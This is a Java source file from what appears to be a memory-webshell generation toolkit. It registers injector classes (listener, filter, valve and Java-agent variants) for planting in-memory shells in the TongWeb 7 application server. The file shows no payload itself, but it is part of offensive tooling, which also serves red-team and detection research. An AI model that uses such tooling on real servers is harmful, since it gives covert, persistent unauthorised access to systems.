package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.tongweb.*;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/27
 */
public class TongWeb7Shell extends AbstractShell {

    @Override
    public Class<?> getListenerInterceptor() {
        return TomcatShell.ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, TongWebListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, TongWebListenerInjector.class)
                .addInjector(FILTER, TongWebFilterInjector.class)
                .addInjector(JAKARTA_FILTER, TongWebFilterInjector.class)
                .addInjector(VALVE, TongWebValveInjector.class)
                .addInjector(JAKARTA_VALVE, TongWebValveInjector.class)
                .addInjector(AGENT_FILTER_CHAIN, TongWebFilterChainAgentInjector.class)
                .addInjector(AGENT_FILTER_CHAIN_ASM, TongWebFilterChainAgentWithAsmInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TongWebContextValveAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE_ASM, TongWebContextValveAgentWithAsmInjector.class)
                .build();
    }
}
